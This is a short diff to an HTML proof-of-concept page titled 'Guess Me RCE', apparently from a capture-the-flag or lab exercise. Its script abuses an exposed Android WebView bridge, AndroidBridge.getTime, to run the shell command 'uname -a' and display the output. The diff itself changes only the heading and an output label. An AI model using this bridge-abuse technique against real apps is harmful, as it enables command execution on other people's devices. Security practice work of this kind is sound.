@@ -6,7 +6,7 @@
 </head>
 <body>
 
-<h1>Exploit guess app</h1>
+<h1>Guess Me RCE</h1>
 <p id="result"></p>
 
 <script>
@@ -15,7 +15,7 @@
     var result = AndroidBridge.getTime("uname -a");
     var lines = result.split('\n');
     var command = lines[0];
-    var fullMessage = "Command: " + command;
+    var fullMessage = "Output: " + command;
     document.getElementById('result').innerText = fullMessage;
 
 </script>
